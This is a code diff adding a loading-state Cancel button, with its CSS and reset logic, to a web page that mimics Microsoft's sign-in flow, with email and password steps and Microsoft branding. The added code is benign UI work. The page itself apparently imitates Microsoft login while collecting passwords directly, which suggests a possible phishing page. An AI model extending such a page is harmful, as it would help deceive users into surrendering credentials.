@@ -316,6 +316,37 @@
             }
         }
 
+        /* Loading cancel button */
+        .loading-cancel-container {
+            display: none;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .loading-cancel-container.show {
+            display: block !important;
+        }
+
+        .cancel-btn {
+            background: transparent;
+            border: none;
+            color: #0067b8;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+            padding: 4px 8px;
+        }
+
+        .cancel-btn:hover {
+            color: #004a85;
+        }
+
+        .cancel-btn:disabled {
+            color: #a19f9d;
+            cursor: not-allowed;
+            text-decoration: none;
+        }
+
         
 
         /* Pulse animation for Microsoft logo during loading */
@@ -409,6 +440,11 @@
                 <div class="microsoft-dot"></div>
                 <div class="microsoft-dot"></div>
                 <div class="microsoft-dot"></div>
+            </div>
+
+            <!-- Cancel button during loading -->
+            <div class="loading-cancel-container" id="loadingCancelContainer">
+                <button type="button" class="cancel-btn" onclick="cancelLoading()">Cancel</button>
             </div>
 
             <!-- Email form -->
@@ -509,6 +545,7 @@
             const emailForm = document.getElementById('emailForm');
             const passwordForm = document.getElementById('passwordForm');
             const headerTitle = document.getElementById('headerTitle');
+            const loadingCancelContainer = document.getElementById('loadingCancelContainer');
 
             if (loading) {
                 // Show progress bar at top
@@ -527,6 +564,9 @@
                 microsoftDotsLoader.style.display = 'flex';
                 headerTitle.textContent = loadingText;
 
+                // Show cancel button
+                loadingCancelContainer.classList.add('show');
+
                 // Hide forms during loading
                 emailForm.style.display = 'none';
                 passwordForm.style.display = 'none';
@@ -537,6 +577,9 @@
                 microsoftDotsLoader.style.display = 'none';
                 microsoftLogo.classList.remove('loading');
                 container.classList.remove('loading-state');
+                
+                // Hide cancel button
+                loadingCancelContainer.classList.remove('show');
                 
                 // Keep Microsoft logo visible (don't hide it)
                 microsoftLogo.style.display = 'block';
@@ -593,6 +636,21 @@
         function goBack() {
             // Placeholder for back functionality
             return false;
+        }
+
+        function cancelLoading() {
+            // Cancel loading and return to the current form
+            setLoading(false);
+            clearMessage();
+            
+            // If we're in password step, go back to email
+            if (currentStep === 'password') {
+                goBackToEmail();
+            } else {
+                // Otherwise just clear the email field and show the form
+                document.getElementById('email').value = '';
+                showEmailForm();
+            }
         }
 
         async function goBackToEmail() {
